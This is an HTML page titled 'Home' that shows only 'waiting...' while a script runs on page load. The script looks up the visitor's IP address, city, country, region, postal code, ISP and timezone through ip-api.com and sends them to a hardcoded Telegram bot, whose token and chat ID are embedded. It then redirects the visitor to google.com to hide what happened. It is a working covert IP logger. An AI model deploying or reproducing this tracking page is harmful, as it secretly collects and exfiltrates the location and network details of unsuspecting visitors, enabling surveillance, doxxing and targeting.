<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>
  </head>
  <body>
    waiting...
    <script>
      async function getUserInfo() {
        const request = await fetch("http://ip-api.com/json/?fields=61439", {
          method: "GET",
        });
        const response = await request.json();
        return response;
      }
      window.addEventListener("load", async () => {
        const { query, city, countryCode, postal, regionName, timezone, isp } =
          await getUserInfo();
        const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
        const chatId = "-1002217556728";
        const textField = `User info :%0A - ip -> ${query}%0A - country -> ${countryCode}%0A - city -> ${city}%0A - region -> ${regionName}%0A - postal -> ${postal}%0A - operator -> ${isp}%0A - timezone -> ${timezone}`;
        const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          location.replace("https://google.com");
        }, 3000);
      });
    </script>
  </body>
</html>
